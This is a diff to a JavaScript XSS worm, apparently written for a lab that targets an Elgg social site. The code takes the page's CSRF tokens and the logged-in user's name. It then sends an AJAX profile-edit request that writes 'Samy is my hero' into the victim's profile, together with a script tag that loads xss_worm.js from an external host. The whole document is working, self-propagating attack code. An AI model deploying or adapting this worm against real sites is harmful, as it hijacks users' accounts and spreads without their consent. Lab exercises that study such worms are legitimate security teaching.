@@ -1,8 +1,7 @@
-<script type="text/javascript">
 window.onload = function() {
     // External malicious script
     var wormCode = encodeURIComponent(
-        `<script type="text/javascript" src="http://example.com/xss_worm.js"</script>`
+        `<script type="text/javascript" src="http://www.example.com/xss_worm.js"></script>`
     );
 
     // Edit profile code
@@ -10,7 +9,7 @@ window.onload = function() {
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
     var name = "&name=" + elgg.session.user.name;
-    var desc = "&description=" + wormCode + "&accesslevel[description]=2";
+    var desc = "&description=Samy is my hero" + wormCode + "&accesslevel[description]=2";
 
     // Construct the content of your url.
     var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
@@ -29,4 +28,3 @@ window.onload = function() {
         Ajax.send(content);
     }
 };
-</script>
